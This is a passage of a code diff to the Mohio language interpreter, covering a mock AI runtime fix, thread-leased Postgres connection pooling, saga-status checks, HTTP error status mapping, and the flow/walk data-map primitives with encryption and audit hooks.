+                f"    Supported today: {shown}. Return one of those and read the fields you "
+                f"need from it.")
+    return (f"ai.decide cannot return `{return_type}`.\n"
+            f"    Supported today: {shown}.\n"
+            f"    An unsupported type used to answer `not confident` on every call rather "
+            f"than saying so.")
+
+
+AI_DECIDE_RETURN_TYPES = ('boolean', 'text', 'result',
+                          'number', 'decimal', 'integer', 'dec', 'int')
+AI_DECIDE_NUMERIC_TYPES = ('number', 'decimal', 'integer', 'dec', 'int')
+
+
 class MockAiRuntime:
     """Deterministic mock AI runtime for Phase 1 testing."""
 
     def __init__(self):
         self._overrides = {}
         self._chains = {}          # ai.connect provider chains, so the mock is a first-class adapter
+        # Q364. Every real runtime carries `_model`, and three call sites print it
+        # (mio.py:1443, :2283, :3945). The mock did not, so `mio ai-check` -- whose OWN
+        # no-key message tells the reader to run MOHIO_AI=mock -- crashed with
+        # "'MockAiRuntime' object has no attribute '_model'". That is the first command a
+        # governance reviewer runs, and its error named a workaround that does not work.
+        # Fixed HERE rather than with a defensive getattr at each reader: the mock is a
+        # first-class adapter by the line above, and an adapter missing an attribute every
+        # other adapter has is the bug. One fix covers all three readers.
+        self._model = 'mock-v1'    # matches the model name set_response already records
 
     def set_response(self, name, result, confidence=0.95):
         self._overrides[name] = AiDecision(
@@ -2737,7 +3729,7 @@ class MockAiRuntime:
                               model='mock-v1', inputs=inputs)
 
         # Number decisions
-        if return_type in ('number', 'decimal', 'integer'):
+        if return_type in AI_DECIDE_NUMERIC_TYPES:
             return AiDecision(result=42, confidence=0.85,
                               model='mock-v1', inputs=inputs)
 
@@ -2746,12 +3738,17 @@ class MockAiRuntime:
             return AiDecision(result="approved", confidence=0.89,
                               model='mock-v1', inputs=inputs)
 
-        # Default: not confident — trigger fallback
-        return AiDecision(result=None, confidence=0.5,
-                          model='mock-v1', inputs=inputs, fell_back=True)
+        # An UNSUPPORTED return type used to land here and come back as
+        # `result=None, confidence=0.5` -- which is indistinguishable from the model
+        # genuinely being unsure, so `ai.decide assess returns sh.FraudDecision` ALWAYS took
+        # the `not confident` branch no matter the input, silently, forever. That is the
+        # unmatched-case-returns-a-plausible-default disease in the flagship capability.
+        # The compile-time refusal should have stopped this long before here; this is the
+        # backstop for any path that reaches the runtime anyway.
+        raise MohioRuntimeError(_ai_return_type_message(return_type))
 
     def agent_turn(self, *, messages, tools=None, model=None,
-                   temperature=None, max_tokens=None):
+                   temperature=None, max_tokens=None, system=None):
         """One scripted agent turn, for deterministic offline agent loops.
 
         Reads self._agent_script (a list), consuming one item per call:
@@ -2933,7 +3930,7 @@ class _InMemorySessionStore:
         return len(self._sessions)
 
 
-class _PostgresSessionStore:
+class _PostgresSessionStore(_ThreadLeasedPool):
     """Postgres-backed session store, built into open core (MOHIO_SESSION_STORE=postgres),
     reusing the app's own DATABASE_URL -- no new secret, same precedent as every other
     Mohio-managed table (lazy auto-create, matching save to / db.upsert; no separate
@@ -2962,10 +3959,26 @@ class _PostgresSessionStore:
 
     def __init__(self, database_url):
         import psycopg2
+        import psycopg2.pool
         self._psycopg2 = psycopg2
-        self.conn = psycopg2.connect(database_url)
-        self.conn.autocommit = False
+        # T0-CONNECTION-POOL 1b (2026-08-30). This held ONE shared psycopg2 connection with
+        # autocommit=False, exactly like PostgresRuntime did -- and the session store is
+        # touched on EVERY request of a stateful app, so it is the hottest instance of the
+        # same bug (zork.mohio.io runs on this path). Same lease discipline as the runtimes:
+        # per thread, released at the request boundary by run_with_session's finally.
+        _min, _max, _timeout = _pool_settings()
+        self._init_pool(_min, _max, _timeout)
+        self._pg_pool = psycopg2.pool.ThreadedConnectionPool(_min, _max, database_url)
         self._ensure_tables()
+        self.release_thread_connection()
+
+    def _pool_get(self):
+        c = self._pg_pool.getconn()
+        c.autocommit = False
+        return c
+
+    def _pool_put(self, conn):
+        self._pg_pool.putconn(conn)
 
     def _ensure_tables(self):
         cur = self.conn.cursor()
@@ -3140,7 +4153,21 @@ class MohioInterpreter:
         import os as _os
         self._ai_call_count   = 0
         self.shown            = []     # `show` output buffer — surfaced by `mio run`
+        # THE ONE RESOLVER. The bare-name sets below are kept alongside it and still
+        # answer for every call site that has not been moved yet, so this arrives as an
+        # addition rather than a swap: a path reading the old set gets exactly what it got
+        # before, and a path reading the resolver gets the qualified answer.
+        self.classification = ClassificationResolver()
         self._encrypted_fields = set() # field names marked sec.encrypt (per run)
+        self._never_store_fields = set()  # field names marked `never store` -> refused at WRITE
+        self._never_log_fields = set()   # field names marked `never log` -> kept out of logs
+        # PHASE 2 ITEM 5 (Q42's binding half). {table name -> [ShapeField]} for every table a
+        # shape declares with `<name> as table`. This is the BINDING the MVP never had: before
+        # it, a shape and a table were related only by a name convention nothing checked, so
+        # `save to db.person` against `shape Person` with a `required` email and a minimum age
+        # WROTE THE VIOLATING ROW -- measured by running, 2026-09-03. The form path enforced the
+        # same shape correctly (422 on both violations) and the write path enforced nothing.
+        self._shaped_tables      = {}
         self._pci_fields       = set() # [pci] field names -> masked to last-4 on output
         self._phi_fields       = set() # [phi] field names -> audit-on-access (HIPAA)
         self._pii_fields       = set() # T1-AUDIT-COVERAGE-GAPS Part C: [pii] field names ->
@@ -3240,7 +4267,131 @@ class MohioInterpreter:
             return html.replace('</body>', tag + '\n</body>', 1)
         return html + '\n' + tag
 
+    def release_db_connections(self):
+        """Return every pooled DB connection this thread is holding.
+
+        T0-CONNECTION-POOL: called at the REQUEST BOUNDARY by mio serve. The pooled runtimes
+        lease per thread and hold the lease for the whole request so a transaction stays
+        coherent; without this call the lease is never given back and the pool drains one
+        worker thread at a time until it is exhausted -- a slow-motion outage rather than an
+        obvious one. Safe to call when nothing is leased, and safe for unpooled runtimes
+        (SQLite/Mongo), which simply do not have the method.
+        """
+        seen = []
+        for c in list(getattr(self, '_connections', {}).values()) + [getattr(self, '_db', None)]:
+            rel = getattr(c, 'release_thread_connection', None)
+            if rel is not None and c not in seen:
+                seen.append(c)
+                try:
+                    rel()
+                except Exception:
+                    pass
+
     def run(self, program, request=None):
+        """Run a program, then hand back any pooled DB connection this thread leased.
+
+        T0-CONNECTION-POOL: the wrapper exists so the release happens on EVERY exit --
+        normal return, `give back`, or exception. Both run entry points have many return
+        paths, and a release placed at any one of them would be missed by the others; a
+        missed release drains the pool one worker thread at a time.
+        """
+        # WHICH SAGA STATUSES THIS PROGRAM ACTUALLY CONSULTS, computed once per run. A saga
+        # binds its status to its name so a caller can `check s.status / when "COMPENSATED"`,
+        # and that is the language's existing way to handle a failed saga. A program that does
+        # that HAS handled it; a program that never looks is the one falling through to a
+        # success response it did not earn. See _exec_SagaDecl for what is done with this.
+        self._index_sagas(program)
+        try:
+            return self._run_inner(program, request=request)
+        finally:
+            self.release_db_connections()
+
+    def _index_sagas(self, program):
+        """Both saga facts, computed once per run, from ONE place.
+
+        Called by every entry point that runs a program. It was first written inline in `run`,
+        and the served path goes through `run_with_session` instead, so the analysis was simply
+        absent there: every saga looked unhandled and unfollowed at once. Keeping it in one
+        method is what stops the next entry point arriving without it.
+        """
+        self._saga_names_read = self._collect_saga_status_reads(program)
+        self._sagas_with_code_after = self._collect_sagas_with_code_after(program)
+
+    @staticmethod
+    def _collect_saga_status_reads(program):
+        """Saga names this program reads back, by any dotted reference to `<name>.something`.
+
+        Deliberately generous: ANY read of the saga's name counts as consulting it. A narrower
+        rule (only `.status`, only inside a `check`) would refuse programs that handle a failed
+        saga in a way nobody enumerated here, and a false refusal on a working program is the
+        error this project treats as the mirror of a silent pass.
+        """
+        from dataclasses import fields as _fields, is_dataclass as _isdc
+        saga_names, read_heads = set(), set()
+
+        def walk(node):
+            if node is None or isinstance(node, (str, int, float, bool)):
+                return
+            if isinstance(node, (list, tuple)):
+                for c in node:
+                    walk(c)
+                return
+            if not _isdc(node):
+                return
+            cls = type(node).__name__
+            if cls == 'SagaDecl':
+                nm = str(getattr(node, 'name', '') or '')
+                if nm:
+                    saga_names.add(nm)
+            parts = getattr(node, 'parts', None)
+            if cls == 'DottedName' and parts:
+                read_heads.add(str(parts[0]))
+            for f in _fields(node):
+                walk(getattr(node, f.name, None))
+
+        walk(getattr(program, 'statements', None) or [])
+        return saga_names & read_heads
+
+    @staticmethod
+    def _collect_sagas_with_code_after(program):
+        """Saga names that have MORE STATEMENTS AFTER THEM in the same block.
+
+        This is the precise shape of the bug. A saga that is the last thing in its block hands
+        its status back as the answer, and three shipped tests read it exactly that way. A saga
+        with statements after it is the dangerous one: those statements run on the premise that
+        the saga did its work, and the last of them is the handler's success response.
+
+        Scoping the refusal to this case is what lets the fix be additive. The first version
+        raised on every failed saga and broke those three tests, which were not wrong: they were
+        describing the other half of a construct that has two legitimate endings.
+        """
+        from dataclasses import fields as _fields, is_dataclass as _isdc
+        followed = set()
+
+        def scan_list(seq):
+            for i, item in enumerate(seq):
+                if type(item).__name__ == 'SagaDecl':
+                    nm = str(getattr(item, 'name', '') or '')
+                    if nm and i < len(seq) - 1:
+                        followed.add(nm)
+
+        def walk(node):
+            if node is None or isinstance(node, (str, int, float, bool)):
+                return
+            if isinstance(node, (list, tuple)):
+                scan_list(node)
+                for c in node:
+                    walk(c)
+                return
+            if not _isdc(node):
+                return
+            for f in _fields(node):
+                walk(getattr(node, f.name, None))
+
+        walk(getattr(program, 'statements', None) or [])
+        return followed
+
+    def _run_inner(self, program, request=None):
         self._ai_call_count = 0   # reset per request
         self._saga_failed = False  # reset saga-failure flag per request
         self.shown = []           # reset show output per request
@@ -3261,9 +4412,17 @@ class MohioInterpreter:
             # request.cookie.mio_session works as a dotted name lookup
             raw_cookies = request.get('__request_cookies__', {})
             clean['cookie'] = raw_cookies
+            # NOT exposed as `request.id`: `request` is bound to a declared SHAPE, and a shape
+            # is the developer's field contract -- adding a field the shape never declared would
+            # be the compiler quietly widening someone's contract, and field access correctly
+            # refuses it ("`id` is not a field on `request`"). Bound as its own value instead,
+            # which adds no vocabulary and does not touch the shape.
             # Also store separately for miocookie.get
             ctx.set('__request_cookies__', MohioValue(raw_cookies, 'shape'))
             ctx.set('request', MohioValue(clean, 'shape'))
+            _rid = getattr(self, '_request_id', None)
+            if _rid:
+                ctx.set('request_id', MohioValue(_rid, 'text'))
             for k, v in clean.items():
                 ctx.set(k, MohioValue(v) if not isinstance(v, dict)
                         else MohioValue(v, 'shape'))
@@ -3274,16 +4433,7 @@ class MohioInterpreter:
             # exactly the cross-file case this must catch.
             self._collect_declared_unique_keys(program)
             self._register_ai_blocks(program)
-            # MioScript: collect browser-event listeners once per program and
-            # compile them to a JS bundle that gets injected into served pages.
-            if getattr(self, '_mioscript_for', None) != id(program):
-                _client_listeners = self._collect_client_listeners(program)
-                if _client_listeners:
-                    from mohio_mioscript import compile_listeners
-                    self._mioscript_js = compile_listeners(_client_listeners)
-                else:
-                    self._mioscript_js = ""
-                self._mioscript_for = id(program)
+            self._ensure_mioscript(program)
             # A stateless REQUEST against a program with routable listeners
             # (listen-for / journey / page) routes by path through the shared
             # router so journeys + listeners coexist and an unmatched path yields a
@@ -3291,8 +4441,8 @@ class MohioInterpreter:
             # Top-level non-listener statements run first (declarations + setup),
             # exactly as _exec_program would; journeys self-wire their own scope.
             if request is not None and self._program_has_listeners(program):
-                from mohio_ast import ListenBlock, JourneyDecl, PageDecl
-                _listener_types = (ListenBlock, JourneyDecl, PageDecl)
+                from mohio_ast import ListenBlock, JourneyDecl
+                _listener_types = (ListenBlock, JourneyDecl)
                 for stmt in program.statements:
                     if not isinstance(stmt, _listener_types):
                         self._exec(stmt, ctx)
@@ -3307,7 +4457,22 @@ class MohioInterpreter:
         except _Raise as r:
             if r.error_name == 'authorization_error':
                 return {'status': 403, 'body': str(r.message)}
-            return {'status': 500, 'body': str(r)}
+            # Was hardcoded to 500 for every OTHER error_name, flattening every other
+            # _RUNTIME_STATUS_TABLE entry (not_found -> 404, validation_error -> 400, ...) to
+            # a wrong 500 -- silent since nothing before hidden: ever raised a non-
+            # authorization_error _Raise from a page-serving path to notice. Body format
+            # (str(r), the "error_name: message" shape) is UNCHANGED on purpose -- several
+            # existing tests assert that prefix appears literally in the body; only the
+            # status now comes from the same honest-status table format_runtime_error uses.
+            # `_mohio_runtime_error` marks this envelope as THE RUNTIME FAILING, as opposed to
+            # a program deliberately answering `give back 503`. `mio run` keys its exit code on
+            # this flag rather than on the status number: a handled outage answering 503 has
+            # WORKED and must stay exit 0, while a raise, a refusal or an internal error must
+            # not. Inferring it from `status >= 500` got that backwards, which the cross-lane
+            # sweep caught before it shipped. Additive key: every existing consumer reads
+            # `status`/`body` and is unaffected.
+            return {'status': _RUNTIME_STATUS_TABLE.get(r.error_name, 500), 'body': str(r),
+                    '_mohio_runtime_error': True}
         except _Jump as j:
             # A real HTTP redirect: 303 See Other (correct for post-redirect-get) and a
             # redirect_to the server turns into a Location header. Was a 302 with the URL
@@ -3318,8 +4483,8 @@ class MohioInterpreter:
         """Legacy: creates SQLite and seeds. Use run_declarations + seed_db for Postgres."""
         self._db = DbRuntime(self.db_path)
         from mohio_audit_grades import canonical_audit_columns as _cac
-        self._db.ensure_table('fraud_audit_log', _cac())
-        self._db.ensure_table('phi_audit_log', _cac())
+        self._db.ensure_table('fraud_audit_log', _cac(), allow_new_columns=True)
+        self._db.ensure_table('phi_audit_log', _cac(), allow_new_columns=True)
         if seed_data:
             for table, rows in seed_data.items():
                 if rows:
@@ -3332,14 +4497,14 @@ class MohioInterpreter:
                                      if r.get('id') is not None
                                      and not any(str(v) == '__schema_template__' for v in r.values())),
                                     None)
-                    self._db.ensure_table(table, cols, id_value=_seed_id)
+                    self._db.ensure_table(table, cols, id_value=_seed_id, allow_new_columns=True)
                     for row in rows:
                         if any(str(v) == '__schema_template__' for v in row.values()):
                             continue  # schema-template sentinel: defines columns, not data
                         self._db.save(table, row)
         if extra_tables:
             for table, cols in extra_tables.items():
-                self._db.ensure_table(table, cols)
+                self._db.ensure_table(table, cols, allow_new_columns=True)
         return self
 
     def _static_table_name(self, target):
@@ -3417,8 +4582,8 @@ class MohioInterpreter:
         if self._db:
             try:
                 from mohio_audit_grades import canonical_audit_columns as _cac
-                self._db.ensure_table('fraud_audit_log', _cac())
-                self._db.ensure_table('phi_audit_log', _cac())
+                self._db.ensure_table('fraud_audit_log', _cac(), allow_new_columns=True)
+                self._db.ensure_table('phi_audit_log', _cac(), allow_new_columns=True)
             except Exception:
                 pass  # Tables may already exist
         return self
@@ -3432,11 +4597,11 @@ class MohioInterpreter:
         app already looked healthy and accepted data -- the single worst failure mode in a
         compliance product. The guard is CONDITIONAL: an app with no encrypted/password fields is
         never forced to have the backend."""
-        if getattr(self, '_encrypted_fields', None):
+        if self.classification.any_field_has('encrypted'):
             try:
                 from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # noqa: F401
             except Exception as e:
-                _fields = ', '.join(sorted(self._encrypted_fields))
+                _fields = ', '.join(self.classification.fields_with('encrypted'))
                 raise MohioRuntimeError(
                     f"This app encrypts data at rest (field(s): {_fields}), but the encryption "
                     f"backend (cryptography) could not load: {e}. Install it "
@@ -3485,7 +4650,7 @@ class MohioInterpreter:
                     try:
                         cols = list(dict.fromkeys(k for r in rows for k in r.keys()))
                         _sid = next((r.get('id') for r in rows if isinstance(r, dict) and r.get('id') is not None), None)
-                        self._db.ensure_table(table, cols, id_value=_sid)
+                        self._db.ensure_table(table, cols, id_value=_sid, allow_new_columns=True)
                         for row in rows:
                             if any(str(v) == '__schema_template__' for v in row.values()):
                                 continue  # schema-template sentinel: columns, not data
@@ -3496,7 +4661,7 @@ class MohioInterpreter:
         if extra_tables:
             for table, cols in extra_tables.items():
                 try:
-                    self._db.ensure_table(table, cols)
+                    self._db.ensure_table(table, cols, allow_new_columns=True)
                 except Exception:
                     pass
         return self
@@ -3623,6 +4788,635 @@ class MohioInterpreter:
 
     # ── Declarations ──────────────────────────────────────────
 
+    # ── `flow`: DRIVE a data map (PROTOTYPED 2026-08-25, needs a ruling to lock) ──────────
+    #
+    # A chain moves a value from stage to stage. Each hop's arrow says which way it moves, and
+    # the arrow is EXECUTED, not decoration: `->` carries the value forward, `<-` carries it
+    # backward, `<->` writes both ways.
+    #
+    # STAGE ADDRESSING DELIBERATELY DOES NOT USE `_resolve_source`. That helper resolves a
+    # dotted source to a TABLE by taking the last segment, so `db.users.email` resolves to the
+    # table `email` -- verified live 2026-08-25 against a database holding both `users` and
+    # `email`, and it silently counted the wrong one, no error. A data pipeline is the worst
+    # possible place to inherit a silent wrong-target bug, so `db.<table>.<column>` is split
+    # here, explicitly, table first.
+
+    def _flow_read(self, stage, ctx, tolerant=False):
+        """The value at a stage, or None when the stage holds nothing yet.
+
+        `tolerant` is what separates INSPECTING from EXECUTING. A `walk` looks at every stage
+        including destinations nothing has written to yet, and a destination table that does not
+        exist is the ordinary state of an app before its first run -- crashing there would make
+        walk useless exactly when it is most wanted. `flow` reads with tolerant=False, because a
+        missing SOURCE is a real problem: reading it as empty and carrying that value downstream
+        would quietly write emptiness into the destination and report success.
+        """
+        q, path = stage.qualifier, stage.path
+        if q == 'db':
+            table, _, column = path.partition('.')
+            db = ctx.get_connection('db')
+            if not db or not table:
+                # `tolerant` is what separates INSPECTING from EXECUTING (see the docstring), and
+                # this early return used to ignore it entirely: a `flow` -- which reads with
+                # tolerant=False precisely so a missing source cannot be read as empty -- got
+                # None here, carried the emptiness downstream, OVERWROTE the destination with it
+                # and exited 0. That is the exact outcome the docstring above forbids, and the
+                # same silent-destroy shape as the `<->` bug. A `walk` still tolerates it,
+                # because inspecting an app that has never run is the ordinary case.
+                if tolerant:
+                    return None
+                if not db:
+                    raise MohioRuntimeError(
+                        "flow: `" + stage.full + "` reads from the database, but no database "
+                        "connection is open. Refusing to read it as empty and carry that "
+                        "downstream -- that would overwrite the destination with nothing and "
+                        "report success. Add `connect db as <driver> from env.DATABASE_URL`.")
+                raise MohioRuntimeError(
+                    "flow: `" + stage.full + "` names no table to read from. A data stage moves "
+                    "a value, so it needs `db.<table>.<column>`.")
+            try:
+                # The value AT this stage is the one most recently put there, not the oldest
+                # row in the table. Reading `limit=1` unordered returned whichever row happened
+                # to come first, so walking a destination after two flows reported the FIRST
+                # flow's value both times -- found by composing a flow inside a query loop, and
+                # invisible on a single run. A destination stage accumulates; what is "there
+                # now" is the last write.
+                rows = db.find_many(table)
+            except Exception:
+                if tolerant:
+                    return None          # nothing has been written here yet
+                raise
+            if not rows:
+                return None
+            rows = [rows[-1]]
+            row = rows[0]
+            # Decrypt on the way out -- the same call `find`/`retrieve`/`grab` make. A pipeline
+            # hop reading a tagged column used to carry raw `enc:v1:...` into an ordinary
+            # variable, and the damage did not stop there: a value flowed INTO a tagged column
+            # was built from that ciphertext, so the destination row DISPLAYED correctly as
+            # `****2222` and was findable-by-value ZERO -- unfindable, and therefore
+            # un-erasable. That is the erasure bug reborn through `flow`, and invisible because
+            # the row looks right. Decrypting here means the downstream write re-encrypts and
+            # re-indexes through the shared write seam, so the destination row is findable and
+            # erasable like any other.
+            row = self._decrypt_row(row)
+            return row.get(column) if column else row
+        holder = ctx.get(q)
+        raw = holder.to_python() if isinstance(holder, MohioValue) else holder
+        if isinstance(raw, dict):
+            cur = raw
+            for seg in path.split('.'):
+                if not isinstance(cur, dict):
+                    return None
+                cur = cur.get(seg)
+            return cur
+        return raw
+
+    def _flow_write(self, stage, value, ctx):
+        """Put `value` at a stage. Returns a short description for the trace."""
+        q, path = stage.qualifier, stage.path
+        if q == 'db':
+            table, _, column = path.partition('.')
+            db = ctx.get_connection('db')
+            if not db or not table:
+                raise MohioRuntimeError(
+                    "flow: `" + stage.full + "` needs an open database connection to write to.")
+            if not column:
+                raise MohioRuntimeError(
+                    "flow: `" + stage.full + "` names a table but no column. A data stage moves "
+                    "a value, so it needs `db.<table>.<column>`.")
+            _fields = {column: value}
+            # Encrypt tagged fields BEFORE the write -- the same call `save` already makes, at the
+            # same seam (see the identical comment in `_exec_ModifyBlock`). A flow hop landing in a
+            # [phi]/[pii]/[pci] column wrote PLAINTEXT while an ordinary `save` to the same column
+            # wrote `enc:v1:...`. `_flow_write` has no AST node to cite, so the fail-loud on a
+            # missing key reports without a line number rather than a wrong one.
+            _fields = self._guard_write(table, _fields, None, 'flow')
+            _row_id = db.save(table, _fields)
+            # A flow hop that lands in a table is a DATA CHANGE and is audited exactly as an
+            # ordinary `save` is -- through the SAME `_audit_data_change` seam, never a second
+            # audit path of its own. Before this, `_flow_write` called `db.save` directly and
+            # reached no audit at all: under an active regulated sector a flow wrote a real
+            # ledger row and `data_audit_log` was never even created, while the identical
+            # sector with a plain `save` produced both an audit record and an incident record.
+            # The sector-gating question (baseline-for-everyone vs sector-gated) is deliberately
+            # NOT decided here -- routing through the shared seam means flow simply inherits
+            # whatever that seam does, today and after any future ruling.
+            self._audit_data_change('save', table, ctx, record_id=_row_id,
+                                    fields=list(_fields.keys()), values=_fields)
+            return "db " + table + "." + column
+        holder = ctx.get(q)
+        raw = holder.to_python() if isinstance(holder, MohioValue) else holder
+        raw = dict(raw) if isinstance(raw, dict) else {}
+        cur = raw
+        segs = path.split('.')
+        for seg in segs[:-1]:
+            cur = cur.setdefault(seg, {})
+        cur[segs[-1]] = value
+        ctx.set(q, MohioValue(raw, 'record'))
+        return q + "." + path
+
+    def _flow_transform(self, stage, value, ctx):
+        """Apply a BARE stage -- a shape the value is reformed by on its way past.
+
+        PROTOTYPED. Today a `shape` is a DECLARATION (fields, types, modifiers) with no way to
+        take a value and hand back a reformed one -- verified by running: `call <shape>` answers
+        "No task named ...". So a bare stage resolves to a TASK if one exists by that name,
+        which is the construct that already takes an input and gives a value back. If neither a
+        task nor a shape exists it FAILS LOUD rather than passing the value through unchanged:
+        a transform that silently does nothing is the exact bug class this project fights.
+        """
+        name = stage.path
+        if ctx.get_task(name) is not None:
+            return self._call_task_with(name, value, ctx)
+        shape = ctx.get_shape(name)
+        if shape is not None:
+            return self._shape_reform(name, shape, value)
+        raise MohioRuntimeError(
+            "flow: `" + name + "` is a transform stage but nothing by that name is declared. "
+            "Declare a `task " + name + "` that takes the value and gives back the reformed one.")
+
+    def _shape_reform(self, name, shape, value):
+        """A SHAPE used as a transform stage reforms the value passing through it.
+
+        A shape is the character description of a value. "Padded to five with zeros" is part of
+        that description, so a shape declares it with the transform verb the language ALREADY
+        has -- `pad.left` / `pad.right` -- and the runtime applies the same padding it applies
+        anywhere else:
+
+            shape normalize
+                value as text pad.left to 5 with "0"
+            shape: done
+
+        SUPERSEDES the first prototype, which invented a `format "00000"` mask and read a run of
+        zeros as "pad to that width". That was cryptic, it was a second spelling of something the
+        language could already say, and nothing else in Mohio reads a mask that way. Reusing the
+        existing verb is both smaller and honest: no new vocabulary at all.
+
+        Deliberately narrow: exactly ONE field, because which field reforms the value is a real
+        question and not one to guess at. A shape declaring no reforming rule is REFUSED rather
+        than passing the value through unchanged -- a transform that silently does nothing is the
+        bug class this project exists to fight.
+        """
+        fields = [f for f in (getattr(shape, 'fields', None) or [])
+                  if type(f).__name__ == 'ShapeField']
+        if len(fields) != 1:
+            raise MohioRuntimeError(
+                "flow: shape `" + name + "` has " + str(len(fields)) + " fields, so it cannot be "
+                "used as a transform stage -- which field reforms the value is ambiguous, and "
+                "Mohio will not pick one for you. A transform shape declares exactly one field, "
+                "and that field's transform verbs are the reforming rule.")
+        text = '' if value is None else str(value)
+        applied = []
+        for mod in (getattr(fields[0], 'modifiers', None) or []):
+            mtype = str(getattr(mod, 'modifier_type', '') or '').lower()
+            if mtype in ('pad.left', 'pad.right'):
+                width, fill = getattr(mod, 'value', (0, ' '))
+                fill = str(fill) if fill not in (None, '') else ' '
+                text = text.rjust(int(width), fill[0]) if mtype == 'pad.left'                     else text.ljust(int(width), fill[0])
+                applied.append(mtype)
+        if not applied:
+            raise MohioRuntimeError(
+                "flow: shape `" + name + "` declares no reforming rule, so using it as a "
+                "transform stage would pass the value through unchanged -- a transform that "
+                "silently does nothing. Give its field a transform verb (`pad.left to 5 with "
+                '"0"`), or write `' + name + "` as a `task` instead.")
+        return text
+
+    def _call_task_with(self, name, value, ctx):
+        """Run a one-argument task on `value` and return what it gives back."""
+        task = ctx.get_task(name)
+        params = list(getattr(task, 'params', None) or [])
+        child = ctx.child() if hasattr(ctx, 'child') else ctx
+        if params:
+            p0 = params[0]
+            pname = getattr(p0, 'name', None) or str(p0)
+            child.set(pname, value if isinstance(value, MohioValue) else MohioValue(value))
+        try:
+            result = self._exec_block(task.body, child)
+        except _GiveBack as gb:
+            result = getattr(gb, 'value', None)
+        return result.to_python() if isinstance(result, MohioValue) else result
+
+    # ── the flow/walk USABILITY layer (T1-FLOW-USABILITY, 2026-08-25) ────────────────────
+    #
+    # These are PRIMITIVES, not tools. They expose the parts -- status, the endpoint, either end
+    # of a chain, every stage -- and the programmer assembles the diagnostic they actually need.
+    # Nothing here interprets: `walk` dumps stages rather than deciding which one looks wrong,
+    # `grab` hands back a stage rather than judging it. Pre-assembled diagnostics (find-the-
+    # broken-hop, monitoring, alerting) belong in the paid service tier, built ON these.
+
+    def _chain_stage_objects(self, node, ctx, verb):
+        """(chain key, [MapStage...]) for a `<map>[.chain]` reference, or fail loud."""
+        chains = (scoped_attr(ctx, '_map_chains') or {}).get(node.map_name)
+        if chains is None:
+            raise MohioRuntimeError(
+                verb + ": no map named `" + node.map_name + "` is declared. Declare it with "
+                "`map " + node.map_name + " ... map: done` first.")
+        if node.chain:
+            if node.chain not in chains:
+                raise MohioRuntimeError(
+                    verb + ": `" + node.map_name + "` has no chain starting at `" + node.chain +
+                    "`. Chains in this map: " + (', '.join(sorted(chains)) or '(none)') + ".")
+            key = node.chain
+        elif len(chains) == 1:
+            key = next(iter(chains))
+        else:
+            raise MohioRuntimeError(
+                verb + ": `" + node.map_name + "` has more than one chain (" +
+                ', '.join(sorted(chains)) + "), so say which one -- `" + node.map_name + "." +
+                sorted(chains)[0] + "`. Mohio will not pick a chain for you.")
+        return key, self._flow_stages(node.map_name, key, ctx)
+
+    @staticmethod
+    def _chain_entry_index(stages, hops):
+        """Where data ENTERS the chain, found by the ARROWS rather than array position.
+
+        Data enters at the stage before the first hop that carries it forward (`->` or `<->`).
+        A chain may open with reverse hops feeding INTO that point, and in that case the written
+        first stage is not where data starts -- which is exactly why this is not index 0.
+        """
+        for i, hop in enumerate(hops or []):
+            if hop in ('forward', 'bidirectional'):
+                return i
+        return 0
+
+    @staticmethod
+    def _chain_exit_index(stages, hops):
+        """Where data comes to REST: the stage after the last forward or bidirectional hop."""
+        for i in range(len(hops or []) - 1, -1, -1):
+            if hops[i] in ('forward', 'bidirectional'):
+                return i + 1
+        return len(stages) - 1 if stages else 0
+
+    def _stage_record(self, node_map, key, stages, dicts, index, ctx):
+        """One stage as a bound value -- the same shape `walk` binds, so a stage is a stage
+        however the program reached it."""
+        st = stages[index]
+        info = dict(dicts[index])
+        info['value'] = '' if st.is_transform else (
+            self._flow_read(st, ctx, tolerant=True) or '')
+        info['chain'] = key
+        info['map'] = node_map
+        return info
+
+    def _exec_CheckFlowStmt(self, node, ctx):
+        """`check flow <map>[.chain] [as NAME]` -- run it and report what landed at the END.
+
+        The 80% question, asked with the word the language already uses for "tell me about
+        this". Runs the flow first (so the answer is about this run, not a stale value), then
+        reads the endpoint. A broken hop fails loud through `flow` itself rather than being
+        reported as an endpoint of nothing.
+        """
+        from mohio_ast import FlowStmt as _Flow
+        self._exec_FlowStmt(_Flow(map_name=node.map_name, chain=node.chain, handlers=[]), ctx)
+        key, stages = self._chain_stage_objects(node, ctx, 'check flow')
+        chains = (scoped_attr(ctx, '_map_chains') or {})[node.map_name]
+        dicts = chains[key]
+        hops = [d.get('departs', '') for d in dicts[:-1]]
+        idx = self._chain_exit_index(stages, hops)
+        info = self._stage_record(node.map_name, key, stages, dicts, idx, ctx)
+        value = info.get('value', '')
+        if node.alias:
+            ctx.set(node.alias, MohioValue(value))
+        else:
+            self.shown.append(f"{node.map_name}.{key} ends at {info['name']} = {value!r}")
+        ctx.set('endpoint', MohioValue(value))
+        return MohioValue(value)
+
+    def _exec_GrabStageStmt(self, node, ctx):
+        """`grab first|last stage` -- the two SEMANTIC ends; `grab stage at N|"name"` between.
+
+        The ends are found by the ARROWS, not by array position: `first` is where data enters,
+        `last` is where it comes to rest. Comparing the two is how a coder asks "did the value
+        survive, or did something mangle it?" -- Mohio hands over both ends; the comparison is
+        the coder's to write.
+        """
+        key, stages = self._chain_stage_objects(node, ctx, 'grab stage')
+        chains = (scoped_attr(ctx, '_map_chains') or {})[node.map_name]
+        dicts = chains[key]
+        if not stages:
+            raise MohioRuntimeError(
+                "grab stage: chain `" + key + "` of `" + node.map_name + "` has no stages.")
+        hops = [d.get('departs', '') for d in dicts[:-1]]
+        if node.which == 'first':
+            idx = self._chain_entry_index(stages, hops)
+        elif node.which == 'last':
+            idx = self._chain_exit_index(stages, hops)
+        elif node.at_name:
+            idx = next((i for i, d in enumerate(dicts) if d.get('name') == node.at_name), None)
+            if idx is None:
+                raise MohioRuntimeError(
+                    "grab stage: chain `" + key + "` has no stage named `" + node.at_name +
+                    "`. Its stages are: " + ', '.join(d.get('name', '?') for d in dicts) + ".")
+        else:
+            # Positions count from 1, as they do everywhere else in Mohio.
+            if node.at_position < 1 or node.at_position > len(stages):
+                raise MohioRuntimeError(
+                    "grab stage: chain `" + key + "` of `" + node.map_name + "` has " +
+                    str(len(stages)) + " stages, so there is no stage " +
+                    str(node.at_position) + ". Positions count from 1.")
+            idx = node.at_position - 1
+        info = self._stage_record(node.map_name, key, stages, dicts, idx, ctx)
+        ctx.set(node.alias or 'stage', MohioValue(info, 'record'))
+        return MohioValue(info, 'record')
+
+    def walk_all_maps(self):
+        """Every map, chain and stage this program declared, with the value at each stage.
+
